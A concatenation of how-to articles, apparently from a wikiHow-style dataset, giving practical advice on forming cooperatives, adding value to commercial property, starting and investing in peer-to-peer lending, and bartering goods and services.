, You must register as a corporation in the state where your cooperative will be doing business. This typically includes filing your articles of incorporation with the secretary of state and paying incorporation fees.The specific process for doing this varies among states. Typically you must file the articles of incorporation with the secretary of state and fill out state registration forms containing basic information about your business.
You also must choose an agent for service of process, who will be listed on these registration forms. Most corporations list their attorney as their agent for service of process.
When you file the articles of incorporation and other forms, you'll have to pay registration fees. These fees vary greatly among states, and may be anywhere from several hundred to a few thousand dollars.

, An EIN is a tax identification number. Your co-op will need a tax ID number to open bank accounts in the co-op's name as well as filing state and federal taxes on behalf of the co-op.You may technically need to get an EIN before you register with the state as a corporation, if the state expects you to include this number on your incorporation documents.
You can get an EIN instantly after answering a few questions on the IRS's website. The IRS never charges a fee for this service.
The online service is only available Monday through Friday from 7 a.m. to 10 p.m. Eastern time.
Once you complete the online form, the online service will instantly generate your cooperative's EIN. You'll also receive confirmation through the mail.

, To do business, your cooperative will need its own bank accounts in the name of the corporation. You may want to shop around to determine which bank is best, since some give discounts and other incentives to cooperatives.The bank accounts should be in the name of the cooperative, using the cooperative's EIN.
If you plan to have employees, you probably will need a separate payroll account in addition to an operating account. Otherwise, you typically only need a single operating account.
Decide who will have access to which accounts, because they will have to complete signature cards to have on file at the bank.

, Depending on the type of work your cooperative is doing, you may need to obtain state or federal licenses and permits before you begin operations. You also may need to have your facilities inspected by regulatory agencies.For example, if you're starting an agricultural co-op, you'll need a federal agricultural permit, in addition to any state or local licenses or permits – which will vary depending on the type of operation you have and the level of production involved.
You also may need to get health and safety inspections, particularly if you plan on serving food for consumption on site.
Various manufacturing, production, and retail environments also may require federal inspections for worker health and safety.
If you're not sure what state permits or licenses you might need, you can find out by visiting the website of the federal Small Business Administration (SBA).
There you will find a page with links to each state. Clicking the name of your state will bring up a list of all the licenses and permits required.

, Membership in a cooperative is voluntary, and typically is open to anyone in the community who wants to take part and is willing to take on the responsibilities of membership.You'll want to work with your steering committee to determine the criteria for membership. For example, many cooperatives require members to live in the same county as the one in which the cooperative is located.
Other cooperatives require members to live within a certain mile radius of the cooperative's location.
You also may require cooperative members to work at the co-op a certain number of hours a week or month, or to pay a certain amount of dues each month in lieu of working.
On the application, you'll need to include space for whatever information the cooperative needs about each member, including name, place of residence, and contact information.

, Regardless of what other advertising and marketing strategies you have, social media is a quick and inexpensive way to connect with the community and get the word out about your cooperative.You can create social media accounts for the cooperative free of charge – although typically you'll have to pay for advertisements or to promote specific posts.
Encourage everyone involved in building the cooperative to ""friend"" or ""follow"" the cooperative's social media accounts, and to ask their friends to do so as well.
Use these accounts not only to share information about the cooperative, but also to provide informative content based on the product or service your cooperative is providing.
If you're not well-versed in social media, consider talking to a marketing or business professor at a nearby university. You may be able to get a student to work as an intern for the cooperative and create social media posts.

, If you plan to hire employees to work at the co-op on a regular basis, you probably want to make your initial hires before you officially open for business. That way you can complete full staff training before you begin full operations.If you've found a cooperative development program near you, this is an opportunity to put their resources to use.
Most of these programs have extensive staff training programs available that you can adapt for your own employees.
They also typically have staff who will come to your co-op and give your new employees an introduction to the world of working at a co-op.

Add square footage to your property.,
Increase the rentable square footage.,
Improve the exterior of your property.,
Update the signage.,
Increase security and parking.",How to Add Value to a Commercial Property1," This is one of the most common ways to add value to a property. If your commercial property has demand for more tenants and they cannot be added within the previously available space, adding more space can be economical.


Depending on the property's purpose, you may increase its value by adding more office, warehouse, storefront, parking, storage, conference, or employee gathering space.
Having covered or reserved parking can give your property a competitive advantage over similar properties being considered by a corporation or business.
Consult with local building authorities for necessary permissions before starting any construction work.;
, It is important to remember that within a property, there is a difference between total square feet and the rentable square feet. If a building is poorly designed, the rentable square feet will be significantly less than the ""actual"" square feet. This means a large part of your property that could be potentially monetized is not.


For example, a building with excessive lobbies, unfinished areas, or poorly organized hallway arrangements could end up having a large portion of the property not rentable.
Consider finishing any incomplete parts of the property, or converting any currently un-rentable areas into rentable areas. For example, one floor may have two large equipment closets. Combining those two rooms into one smaller closet and renting the other part out as a small office can add value., The external appearance of your property can greatly influence its value. Fortunately, there are several low cost ways to add value through making external improvements.Negotiate with cleaning and garbage pickup company to provide services to tenants as part of rent.
Making sure the grounds, parking lots, bathrooms, and walkways of your building are extremely clean is the cheapest and easiest way to boost the value of your property. This means cleaning up garbage, ensuring lawns are cut and well-manicured, removing clutter, and ensuring there are no odd smells.
Update windows and doors. If the windows and doors of your property are outdated, not fashionable, or poorly designed, consider updating them. Investing in new windows and doors can not only improve the appearance of your home, but it can also reduce noise, increase natural light, and help reduce heating/cooling bills.
Paint. Painting the outside brick or siding is a simple and easy way to refresh the appearance of your property and give it a new appearance without making significant structural changes.Invest in professional landscaping. Professional landscaping can significantly improve the outside appearance of your property at a reasonable cost.

, The signage should attract people in from the outside, and should accurately represent a property's purpose.


If signage is inadequately sized in comparison to the architecture (or competing signs), hidden by the landscaping, difficult to read, looks unappealing, or is otherwise a misrepresentation of the property's purpose, you can go a long way in increasing the value of your commercial property by adding new signage or updating the old.
Consider a variety of sign styles, materials, sizes and placements. Consult with a sign maker to learn of all your options and make the best decisions for your property., Security features like alarm systems, gates, and shutters can increase property value by making the property more attractive to tenants and lowering your insurance premium. In addition, some areas may justify hiring private guards.


For parking, consider renting from nearby lots that go unused during your tenants’ operation hours. For instance, your tenants’ businesses may have daytime hours but there is a nightclub lot nearby that is empty during the day.You could consider renting the nightclub lot out during the day to a food truck or another mobile business.

Organizing your business either as a corporation or as an LLC can shield your personal assets from creditors. Which entity you choose depends to a large extent on the size of your startup team and the level of formality you want.
Corporations typically have significantly more formal requirements than LLCs, including record keeping and reporting requirements. You also must have a specific number of shareholder meetings each year, whereas these requirements typically don't exist with LLCs.LLCs also have a different tax status than corporations, although an LLC can elect to be taxed as a corporation, so the entity you choose may have little effect on your taxes, but you must make sure you understand the tax method you want to use.;
, You typically must register your name with the states in which you plan to do business.


Keep in mind that although your business name may be the same as your domain name, these are not the same thing. You may want to use a broader name as your business name in anticipation of opening more websites under different domain names in the future.
The rules governing registration of business names vary widely among states, so make sure you understand the registration and filing requirements for the state in which you plan to register your business.The state will have a directory of business names, and you must choose one that isn't already registered by someone else in that state. Depending on which entity you've chosen, your business name typically must identify that entity.For example, if you've chosen to register as a corporation, your name may be ""P2P Lending, Inc."" However, if you've organized as an LLC, you must use ""P2P Lending, LLC"" instead.
You must file the paperwork required by your state, which typically includes your articles of organization and may include other formation documents, and pay registration fees., Choose a domain name that is easy for potential customers to remember.There are a number of domain registration services such as Go Daddy or Domain.com where you can not only register a domain but also add email and hosting services as needed.
Choosing a unique domain name can preserve your ability to trademark the name or a logo at a later date, if you choose to do so.

, In addition to people who know how to operate a website, you should also include team members who have knowledge of banking and financial regulations and know how to run a business.


Your team should include at least one attorney who has experience navigating state and federal regulation of the lending sector.You also should look for someone who has extensive experience in the banking industry, and understands how to assess credit risk and build a lending business.Don't scrimp on software engineers and tech assistance. Although you may be able to outsource much of this need depending on the platform and hosting services you choose, you must have dedicated team members who can react quickly to resolve any problems that may arise.You also should consider bringing someone on your team who has education and experience in marketing and advertising. If you don't have someone in-house, you probably will have to start an account with a marketing firm, which could become more expensive in the long run.Someone with strong relationships in capital markets can be valuable in helping you raise the initial capital you'll need to get your p2p lending business off the ground. If you don't know or have any connections to venture capitalists and investors, you may have difficulty raising the funds necessary to enable your startup to continue operations through early growth periods before you're turning a profit.While you can have an outside attorney or firm on retainer, hiring someone as in-house counsel can be a tremendous asset and provide you with more flexibility and ensure that you stay in compliance with regulations that may evolve rapidly., In addition to running your website and other operating expenses, you'll need money to borrow to your first customers before p2p investors start putting up money.


Even though you'll be in the business of lending money to other people (or connecting them with people willing to lend to them), it's important at this stage to understand your credit score and credit history, because that will determine how much initial capital you can raise and what investors are willing to work with you.How much money you'll need will depend on how many loans you need to finance on your own before your website takes off and you have private investors funding the requested loans. Keep in mind that this could take some time.You will need to use this money to establish a relationship with an originating bank, which will be the bank through which all of your p2p loans are serviced., Although you could build your system architecture from scratch, it probably makes more sense to subscribe to an existing program.


There are a number of web development companies that offer either raw codes and scripts that you can adapt to your system.Other companies have more plug-and-play type system solutions, providing you with an entire platform that you simply customize with names and titles to suit your needs.If you're low on funds, you might check out Zidisha, a p2p lending company that offers micro loans to entrepreneurs in developing countries. The organization has released the source code of their entire platform under an open-source license for anyone to use.These software solutions automate many of the processes you'll need, including the application and screening processes for borrowers and security and protections for lenders., Your final product should be intuitive, easy to understand, and easy to navigate for both lenders and borrowers.


Some of the p2p lending platforms include basic web design, but you'll want to adapt and customize this to make your site stand out in the field.
Make sure all the basic functions someone would need to do are clear and available. For example, if someone comes to your site and wants to apply for a loan, you don't want him or her to have to hunt around for the application form. Similarly, if someone wants to invest and become a lender, you want that to be easy to do.
When you develop your website, focusing on the customer experience is vital.If people visiting your site can't figure out how to do what they want to do, and can't get help when they need it, they will go somewhere else.

, If you haven't already, hiring an attorney is imperative if you want to avoid running afoul of the many complex securities and banking regulations that affect p2p lending.


There are many businesses you can start without necessarily needing an attorney, but a p2p lending business is not one of them. If you intend to enter this sector, you should have legal counsel in place before you sign the first loan agreement.Keep in mind that both the consumer credit side and the funding side of your business are subject to extensive regulation, and many of these areas of law are in flux as the legislative process plays catch-up with the rapid development of the p2p lending sector., Finance and consumer credit professionals can help you ensure all your policies and procedures stay up-to-date and in compliance.


If you haven't already, make sure your startup team includes someone with extensive education and experience in the banking sector. Ideally, you want to add someone to your team that has years of senior or upper-level management experience in a financial institution.Keep in mind this person won't come cheap.
Experienced finance investors can put systems in place to effectively score your borrowers and lower the inherent risks involved with p2p lending.Keep in mind that many federal laws, including the Electronic Fund Transfer Act, the Fair Credit Reporting Act, and the Bank Secrecy Act, will likely apply to your p2p lending business.Someone with experience in the banking and finance industry will already know what to do to keep the company from violating these laws.

, Federal consumer credit laws forbid the use of certain discriminatory practices in lending.


The Equal Credit Opportunity Act establishes guidelines you must follow when you gather and evaluate your borrowers' credit information, as well as the content of the written notification you must provide if you deny credit.Keep in mind that most of the borrowers you attract will come with a significant amount of risk. Typically people attracted to p2p lending are people who have been turned away by traditional lending institutions.For this reason, it's imperative that you develop an adequate process to screen and qualify borrowers. However, your screening process cannot disqualify or penalize people for unlawful reasons such as race, sex, religion, or marital status., Your loan agreement generally must comply with the federal Truth in Lending Act, which establishes uniform methods for disclosing credit terms.All terms should be laid out in writing explicitly, in words that your customers will understand. Although you can use the terms and conditions from traditional bank loans as samples to guide you, make your loan agreement your own and tailor the terms to suit the product you're offering.Using traditional bank terms as a guide also can help ensure that you're meeting the requirements of federal law by including certain conditional language and types of disclosures.Keep in mind that just like traditional banks, you can make money off of more than just interest. Your loan agreement should include fees or penalties for late payments or insufficient funds. You can look at traditional bank loan terms to get an idea of where you can charge those fees, but you probably want to keep your fees lower than traditional banks., Apart from federal regulations, your state may have additional registration and filing requirements for p2p lending institutions.


Keep in mind that you must make sure you have the appropriate licensing in every state in which you anticipate brokering, making, or servicing loans. If you have a website, this potentially means having licensing in place in all 50 states.State licensing requirements typically include certain bookkeeping and reporting requirements, minimum net worth, and the posting of a surety bond.Since each state's requirements will differ depending on the size of the loan being made, the length of the loan, and the interest rates and fees, you might consider reviewing these regulations to determine which states it makes the most sense to exclude. If a handful of states have licensing requirements far out of step with the majority, for example, you can choose not to service those states.Make sure you clearly display at appropriate places on your website the states in which your services are not available.
Using an established bank can be efficient in getting you around all these individual state licensing requirements., Partnering with an established bank may allow you to offer a broader variety of loan and investment products.Partnering with an existing traditional bank also solves many of the regulation problems involved with your loan products, since the bank will already have compliance procedures in place.
Additionally, given that you are a newcomer to the scene with no operating history, potential lenders may feel more comfortable investing their money if you are backed by a bank with an established track record of profitability.
Keep in mind that typically you will need an originating bank to initiate loans and issue notes to your private investors who have agreed to fund the loan.However, you may wish to partner with other banks to gain other services or offer additional products to your customers.

, Because there are so many p2p lending companies out there, you must find a way in which what you have to offer is different from all the others if you want to stand out.For example, you might choose to focus your business on just one type of lending, such as loans for people who want to pay off or pay down their student loans.
Many of the most established p2p lending companies started with personal loans and are starting to move towards small business loans, so you may want to create a niche there.For example, you might decide to focus primarily on small business loans for people who want to open restaurants.
Keep in mind that with more and more players entering this sector, the market is extremely competitive.To build a successful p2p lending business, you must set your service apart from the crowd. Focus your marketing efforts on what it is about your business that makes you unique.

, Corporate and financial projections can be used to educate potential lenders and borrowers alike about the value of your service.


You potentially will need to file certain documents with the SEC, including a yearly prospectus, sales reports, and other filings. Providing open access to these documents on your website will attract prospective investors who want more information about your company's financial structure and health.Other business planning documents can help legitimize your p2p lending business in the eyes of the public and make potential investors more comfortable working with you.

, Press attention can be an efficient and cost-effective way to draw attention to your business.


Press attention (along with word-of-mouth) may be the best way to attract investors willing to lend money through your business. Because p2p lending already carries inherent risks, investors will be more likely to use your service if an established authority speaks highly of it.You might consider starting with popular and respected financial or business websites. Bloggers for these websites are under a lot of pressure to produce content, and often are looking for up-and-coming businesses to write about.

, If you advertise to borrowers first, lender-investors looking to expand and diversify their portfolios will naturally follow.


Most of the existing p2p lending businesses have had less difficulty attracting investors than attracting qualified borrowers, leading to greater available investor money than there is borrower demand.Having a unique angle allows you to focus your advertising on the particular borrowers you're seeking to attract, which can save you money relative to broad campaigns aimed at all consumers looking for personal loans.
Maintaining an active presence in social media can help you build your business using word of mouth.

Decrease expenses.,
Request that the tax assessor re-evaluate your property value.,
Modernize your property.",How to Add Value to a Commercial Property2," For a commercial property, the value depends largely on how profitable it is. Profits can be increased by raising rents, or, by reducing expenses. Fortunately, it is possible to reduce expenses without impacting the operations of the property significantly.


Consider adding energy efficient light bulbs throughout the property. This will cost money upfront, but will save significantly over time.
Consider passing some expenses, like gas utilities for example, on to tenants. If your gas company can individually meter units, consider asking them to do so. This will enable you to monitor and charge gas expenses to individual tenants.
Investing in modern heating and air conditioning systems can also go a long way to reducing costs over the long-term.
Enter into a long-term contract with suppliers. This may decrease the costs of your regular supplies purchases.
Consistent maintenance can also reduce your expenses by reducing the chance of expensive accidents.

, Property valuations are often outdated or inaccurate, and sometimes a simple reassessment can significantly lower your tax obligation, thus improving your bottom line..


Your property value is often only assessed by local governments, and therefore your property value may reflect a time period where property values were higher. In addition, assessors often make errors, and your assessor very well may have over-estimated how valuable your property is.
If you feel your property is overvalued, you can contact your local tax assessor and ask for a revaluation. If you are unhappy with the new figure, you can always appeal their opinion.
To do so, visit your tax assessor's office and request forms to appeal. You can also request information on the values of other properties as well. If you notice that similar properties are carrying lower valuations, the strength of your case increases greatly.
Alternatively, contact an attorney or real estate agent who specializes in appealing property assessments.

, The building should be up-to-date, comparable to surrounding buildings in quality and representative of the area's aesthetic style. Make sure that you’re using current, energy-efficient heating and air-conditioning, water heaters, and lights to save on regular energy costs.Upgrading the roofing on your property can be one way to modernize its appearance, cut costs, and prevent damage to your property.

Go green. When updating your property, keep eco-friendliness in mind. This will not only keep your property relevant in today's earth-conscious consumer market, but it will also lower overhead costs. Green options include solar panels, energy-efficient appliances and energy conserving windows. There may even be tax incentives.When modernizing, ensure every change creates more value than it costs. For example, if you are spending $2,000 on new air conditioning, for example, this new air conditioning should lead to $2,000 in saved costs over time, or should enable you to attract, maintain, or increase rents on tenants.

Know the neighborhood.,
Name the property.,
Find tenants.,
Avoid vacancies.,
Raise the rent.",How to Add Value to a Commercial Property3," Knowing how much other commercial properties in the area sell for and the general market value of the area will be helpful in determining what direction to go in for the commercial aspect of the property.


What is most desirable right now in this area? What does the neighborhood need? What other future developments are happening (a new school, condominium, or shopping center) that will affect the supply and demand of your investment?, Naming a property lends it character and charm, and enables people to identify its purpose and position in the market. This is integral to branding the property, which can significantly increase its value.


For name ideas, consider the property's history, placement within the community, purpose, neighborhood, and tenants.
You can also consider selling the naming rights to a large tenant.
On the topic of names, consider changing the name of the street or road where the property is located if it is odd or extremely difficult to pronounce. For instance, Shades of Death Road (located in NJ) may see some struggle on commercial property value. You can petition to your local planning and zoning departments to have street names changed., If your commercial property has space to for more tenants, there are a number of methods you can use to find tenants and increase property value.


Offer move-in specials to attract new tenants. For example, you can offer a discounted first month rent rate, a low deposit amount or a short-term lease to get tenants into your property.For example, ask existing tenants to refer new tenants and consider offering an incentive in return. Incentive examples include a finder's fee, one month of a discounted rent rate, or access to a premium property amenity.
Getting new tenants through referrals may increase the tenant synergy of the building, meaning that the types of businesses will be in similar categories. For instance, lack of tenant synergy would be having a shop selling high-end Gucci bags and women’s accessories next to a pawn shop, and this is something that brings property value down., An empty building is a certain way to decrease the value of your property dramatically. Fortunately, having the proper policies and procedures can greatly help in retaining tenants and avoiding vacancies.


Maintain an excellent relationship with your tenants. This means addressing their concerns promptly, being available, and maintaining the property. This can help to retain tenants.
Keep in touch with the wants and needs of your target tenant market. Do you own a high-end apartment building? Having gym facilities, wi-fi, and ample parking may be important.

, Commercial real estate buyers are focused on income, and one of the easiest ways to increase your income is to increase your rent. Increasing rent, however, needs to be done carefully. If your building has a very high occupancy rate (95 – 100%) this may be an indication that your rents can increase.


If your property is comprised of smaller businesses or low-income tenants, raising the rent may be unwise, since you could inadvertently decrease your occupancy rate. This could mean lower revenues for you, and more difficulty attracting new tenants.
However, if your property has higher-end tenants, if your neighborhood is popular, if there is a waiting list for your property, or if nearby property rents are higher, consider raising your rents. The goal is to charge the maximum amount of rent possible without having tenants leave or reducing your ability to attract new ones.
Consider whether or not recent investments to the property justify higher rents as well. For example, you may have invested in a high-quality parking lot, new security measures, or top-notch air conditioning. All of these could justify higher rents. "

Consider Peer to Peer Lending as an addition to your overall financial portfolio.,
Set a Goal and Achieve It.,
To make a profit in Peer to Peer Lending, have a solid financial foundation.,
Develop a comprehensive system, to invest in borrowers, based on the information that is available on the borrower.,
Do research on the Peer to Peer Lending Companies.

,
Make an initial deposit, the minimum deposit for the two leading companies are under $50.",How to Profit from Peer to Peer Lending," A solid foundation is basic - research, think and decide what your financial portfolio should comprise of. The advice of financial advisers are similar and your portfolio should not deviate too much from their advice. Here are some elements of a traditional financial portfolio:


Emergency or Contingency Fund. For employees you must have saved up a minimum of three months of your monthly expenses and put in fairly liquid account. Self-employed should have a minimum of six months of their monthly expenses saved for emergencies and also in a fairly liquid account. This fund is for no other purpose other than emergencies. A checking account is very liquid and savings account without an ATM card is a good choice for most people.
Checking and Savings accounts. If you are paying fees for not meeting minimum monthly balances and overdrafts, then investing should be postponed. These bank fees will be in excess of what you earn from investing. Use the savings account for installment purchases, vacations and as a temporary holding account for your investments. For example,if your minimum stock investment is $5,000 and you have just $1,000 in your stock account accumulated from interest, dividends and capital gains - put that $1,000 into your higher interest savings account.
Credit Card. Have a card for daily use and earn points for rewards and another card with a low rate for installment purchase. Making just one installment purchase (and paying it off) at a time with your low rate card is the ideal. Credit Cards have a buyer protection feature so even with the interest rates, they are better than paying with cash
Time deposits. CDs are semi-liquid, FDIC insured and yield more than a savings account.
Retirement Account. There are a wide variety of retirement account vehicles.
Have a well diversified portfolio. Peer to Peer lending is an excellent addition to your portfolio. Lending Club and Prosper are the two biggest Peer to Peer Lending sites and their loans have a three year payback period. Classification of this investment is varied there is some liquidity, there is regular income and if money is not withdrawn it is a long term investment. There is no FDIC or SIPC insurance.;
, A yield of 2% above a 12 month deposit is realistic. The two percent pays for the investment in time and other risk factors. The cash account balance increases rapidly after a certain balance is reached, so daily or weekly, the cash account money, which earns no interest, must be reinvested. The liquidity of peer to peer accounts is great and can be considered as an income source. For those willing to work hard and smart greater returns are possible.

, This is not a get rich quick scheme and in the long run, the outstanding returns of some lenders eventually settle into a number that is reasonable and achievable. The great returns (mostly short-term) of some lender are highly touted, but it is the long-term results that matter.

, Each bit of information branches out into a preset criteria in the overall decision making. For example, the borrowers age can be put into a certain age group range from his earliest credit account, length of employment etc. From this age group estimate, from research already conducted, there is the percentage of default to be considered. Find statistics on student loan defaults by age and statistics for personal bankruptcy by age as there should be no statistics on peer to peer borrower default by age.

,, The number of lenders are growing rapidly, people enjoy being part of the decision-making process in lending and the prospect for nice returns are very possible. Transferring money in and out to a checking account is very fast, simple and done from the website with the click of a button.

This committee will perform the initial exploratory meetings and perform analyses to decide if a coop is feasible.Ideally, you will want to form an organizing committee with like-minded individuals who are passionate about the issue driving the need for the coop.


Reach out to friends or family members who might be interested in forming a coop.
You could also contact charities. Sometimes, charities decide to form non-profits in order to advance their goals in the community. Charity members might be interested in helping to form the non-profit cooperative.;
, Members of a coop are intimately involved with all day-to-day operations of the organization. Accordingly, all members will need to be on the same page when it comes to the coop’s goals and strategy. Once you have identified a core group of people interested in forming the organizing committee, you should schedule several meetings where you can discuss the following:


What are your goals and strategy? To form a credit union that can bring economic opportunity to a depressed economic area? To sell locally produced goods? To create independent media?Will the business grow out of an existing one, or will it be built up from the ground?
Does the organizing committee have all of the expertise necessary to run the coop? What other expertise is necessary?
How will decisions be made? You should consider whether decisions will be made unanimously, by majority, or by supermajority (more than 50% but less than 100%).
How will you hire new people? Since the cooperative structure is so different from traditional work environments, you might want to give people a trial period to see if they like it. If the employee is a poor fit, then you can end the work relationship.

, Before starting the process of creating your nonprofit cooperative, you need to figure out how to pay for the initial start-up costs. You should create a budget and then identify realistic sources of funding. You have different options:You can get the money from members. Each founding member contributes money.
You could get a loan. Identify a bank (or a credit union) that has given loans to cooperatives before.
A grant from a cooperative incubator.

, Also called “cooperative developers,” these organizations help new incubators get off the ground. They often provide advice, training, and other resources to help cooperatives establish themselves.Some incubators help businesses transition from one form to the cooperative form, whereas other incubators will help new cooperatives start from scratch.


To find an incubator, search the Internet. Type “cooperative incubator” and your state into your favorite search engine.
You have to apply for the incubator program and meet any program requirements that it has established. You may also need to pay an initial fee as well as monthly fees to continue to receive help.

, Cooperatives that are run for the mutual benefit of its members can sometimes qualify as non-profits. These are fairly rare, though. Accordingly, you should bring a business lawyer into your planning very early on in the process. If your state doesn’t let you form non-profit cooperatives, then you should find that out before beginning your planning for the coop.


To find an experienced business attorney, you should contact your local or state bar association and ask for a referral.Alternately, you could ask another cooperative if they would recommend their lawyer. Once you have the name of the lawyer, schedule a consultation.
You will have to pay for legal advice. Even if the lawyer agrees to a free initial consultation, he or she is unlikely to give out legal advice for free. Typically, the consultation is simply a “meet and greet” affair. However, if you are looking for legal advice, then say so when you call to schedule the consultation. The lawyer can quote you a price for a half hour or hour of legal advice.

, Not every state allows you to create this kind of business. Before meeting with the lawyer, sketch out what your plans are for the non-profit and ask the lawyer whether you think this type of cooperative would qualify for non-profit status.


The most common non-profit cooperatives are credit unions and housing coops.
Nonprofit cooperatives were also created as a response to the national healthcare legislation passed in 2010., If the lawyer thinks you can legally form a non-profit cooperative in your state, then he or she should help you find necessary forms to fill out. For example, you will need to complete Articles of Incorporation and file them with your state’s Department of Corporations or Secretary of State’s Office.Your lawyer should be able to get the forms for you.


In order to operate as a non-profit, you also need to fill out applications for federal and state tax exemptions.This is how you apply for non-profit status. If you are denied non-profit status, then your coop will be for profit.

, You should develop a good relationship with your lawyer, because you may have to return several times in the future for advice. For example, you should have the lawyer look over your bylaws as well as other organizational materials.


In the future, you may need a lawyer’s advice to help you with hiring or firing employees, defending yourself in a lawsuit, or dealing with the IRS.

, Your state law may require that you create bylaws.Bylaws essentially serve as the operating manual for how the cooperative will be run. Even if your state doesn’t require bylaws, it is a good idea to create them. Make sure to include the following when you draft your bylaws:membership requirements
member duties
the responsibilities of coop members

, You need to give people a way to join your non-profit cooperative. You should create a template which you can copy and distribute to multiple people to fill out. Make sure your membership application contains the following:the applicant’s name
a summary of member rights and benefits
signature from the board of directors

, The initial group of members are called “chartered members.” You will need to discuss and possibly revise any bylaws at the initial meeting. You also need to identify the board of directors if they were not named in your articles of incorporation.Remember that you must follow your state’s laws on record keeping, which includes taking minutes of your meetings. You should talk with your lawyer about precise requirements in your state.

, You can’t run any business, not even a non-profit, unless you have the required licenses and permits applicable to your business. You should contact your state to find out what licenses and permits you will need.


To find what you need, you can visit the Small Business Administration’s website, which provides links to the office in each state that issues permits.Be sure to get all necessary permits and licenses before beginning your business. It is illegal to run a business without your state’s approval.

Consider your professional services.,
Identify skills associated with your hobbies.,
Brainstorm to discover your less obvious skills.,
Offer less specialized tasks that others may not be able or willing to do themselves.,
Find items you want to get rid of.,
Lend people the use of your house, car, or other expensive items.",How to Barter1," The most obvious bartering choice is a service you already provide as a job, or have provided in the past. Everything from dental work to carpentry can be offered in bartering. Let potential bartering partners know you have professional experience in the area, and they will likely find your offer more appealing.


If you run a business, consider offering your standard services in exchange for designing brochures, preparing taxes, or filling another business need. This can be a great way to attract customers who wouldn't otherwise hire you or purchase your goods, without losing value.;
, If you enjoy cooking or baking, you can offer people a home-cooked meal or pie. Art and craft items are sometimes in high demand, especially if you offer to create a piece customized to the bartering partner. If you can't think of a good or service created by your hobby, ask a close friend for suggestions: you might not realize that tinkering with your car or writing poetry in your spare time has given you valuable skills.


Think about hobbies related to home upkeep, such as gardening or D.I.Y. home repair.

, Many people pick up skills in their job, hobbies, or everyday life that they don't necessarily realize. Write down a list of every task you do on a regular basis. Look through each item on this list and identify what skills and specialized knowledge you have that allows you to perform these tasks quickly and skillfully.


Many people have trouble with mathematical tasks, such as preparing their taxes or keeping good accounts of their business or household expenditures. Quick, accurate multiplication and division may be all you need to offer some basic services.
Other skills include home organization, computer troubleshooting, translation (if you are bilingual), or copy editing.

, Many bartering trades involve pet sitting, garden weeding, errand running, house cleaning, and other services that some people can perform more easily than others. If you enjoy any of these common tasks, or if you can do them quickly, consider offering these services. These tasks can be a hardship for people with no transportation, health or mobility problems, or a busy schedule.


If you have special skills or experience in any of these, mention them in bartering discussions. Stretching a grocery budget or caring for an exotic pet might be something you take for granted, but they might be exactly what someone is looking for.

, Poke around your place from a bartering perspective; there may be little things that would be hard to sell but easy to barter in small trades. Unwanted books and clothing, an extra toaster or other appliance, or even unopened wine bottles or food items can be exchanged in small trades.


If you barter small items frequently, try searching for free or cheap items at garage sales, which you may be able to barter later.
If you grow food or raise animals for eggs or meat, you may be able to barter away some of the results.

, If you can arrange a house swap while you go on vacation, you can save a lot of money on hotel rooms. Alternatively, you can rent out a spare room in a bartering deal instead of charging money, or just let a traveler crash on your couch for a few days. People may also be interested in borrowing a car, or arranging for you to drive them somewhere. If you have access to a table saw, lawn mower, or other expensive tools, you could lend them to bartering partners.


This type of bartering can be a little riskier, since you are giving someone access to valuable items that you want back. Depending on your comfort level, you may only want to do this type of bartering with friends, or with people a mutual friend can vouch for.

Look for online bartering websites.,
Join a time bank to trade services only.,
Find bartering opportunities in your community.,
Advertise in your local community.,
Have your business join a barter exchange.,
Just ask.",How to Barter2," Website where bartering deals are arranged range from the all-purpose, such as Craigslist or U-Exchange, to the specific, such as SwapStyle for clothing or BookMooch for books.Make sure to read the instructions carefully and learn about any membership fees, or fees to receive or send items, before you get involved with a new site.


Some websites require you to pay for the cost of shipping your items, which can be expensive if you are sending heavy or bulky items. It's always a good idea to find out how much the shipping would cost before you agree to a trade.
On some websites, members contact each other to arrange a deal. On others, you earn ""points"" (or another virtual currency) for providing items or services, which you can then use to request items or services from other people.

, If you are interested in trading services more than goods, join a time bank in your area or start one yourself. Anyone who joins the time bank can ""hire"" someone else for any type of work. Instead of getting paid, the person who does the work gets the number of hours she worked recorded in the database. She can then ""hire"" another member of the time bank for that number of hours. In a standard time bank system, one hour of work is always worth the same as another hour of work, regardless of how much hiring someone to do that work would normally cost This can make haggling over deals much simpler.


For instance, Frederico does six hours of math tutoring for Brad, and gets six hours recorded by the people running the time bank. Frederico then ""uses up"" four hours by hiring another time bank member, Alicia, to do four hours of carpentry. Frederico now has two hours credit in the time bank, which he can use to hire any other time bank member.

, Searching online for bartering groups in your town or region may lead to a community forum where you can make deals with people nearby. Also check out community message boards or locations where flyers are posted to find out about deals on offer. One major advantage to local deals is the ability to trade services that require meeting face to face, or items that are too heavy or delicate to mail.


Large websites such as Craigslist often allow you to search for deals in your region.

, Whether you are looking for individual trades or running a business, advertising locally is a great way to draw attention to your bartering offer. Put up flyers around your community, talk to neighbors, or organize a family gift swap for the holiday season. Finding regular or long-term bartering partners this way can be a great way to save money on recurring needs, such as lawn care, or build better relations with your neighbors.


Your community center, community newspaper, or church may be able to help spread the word for free or for a small fee.

, Businesses can use the other methods to arrange bartering deals with customers, but your business might be looking for ways to save money when dealing with other companies as well. Consider joining a barter exchange for this purpose. Much like some bartering groups for individuals, most exchanges work by crediting your business' account with a virtual currency whenever you provide a service for another member. You can use this virtual currency to acquire services in return, although you may need to pay a fee for the exchange's matchmaking service.


Always look up the exchange at the Better Business Bureau and online review sites to find out if there services are above-board and worth the fees.

, It never hurts to ask whether someone is open to a barter arrangement, as long as you accept ""no"" for an answer. Most people and businesses are not used to bartering, but may be willing if the right opportunity presents itself. Mention what services or goods you're offering, ask if there's anything specific they're looking for, then drop the subject if they show no interest.

Use phrases such as ""Are you interested in bartering?"" or ""I'd be willing to trade services instead of cash if you need any home repairs done."" Don't begin by offering an exact quantity of goods or haggling over the price of the visit; make sure the other person is open to the idea first.

, If you were referred to a bartering partner by a friend, ask that friend about the partner's reliability. Request that the bartering partner show examples of his work if possible, and ask about his experience or certification, if relevant. The more valuable the deal, the more important it is to make sure you'll be receiving a high quality ""payment.""


If you are bartering for an item nearby, examine it in person. If bartering long-distance, ask to see photographs of the item on each side.
If you suspect the bartering partner might not live up to their end of the bargain, invite a friend or a neutral third party to come with you as a witness when you make the deal. Better yet, don't barter with people you don't trust.

, It's best to be exact about your offer before you get too far into the negotiating. Does ""yard work"" mean weeding the garden, or a full landscaping job transplanting trees? Are the items you are offering fully functional, or are there surprises the other person should know about? It's difficult to negotiate over a deal if the two parties have a different understanding of what's being offered, so clarify the offer as early as possible.


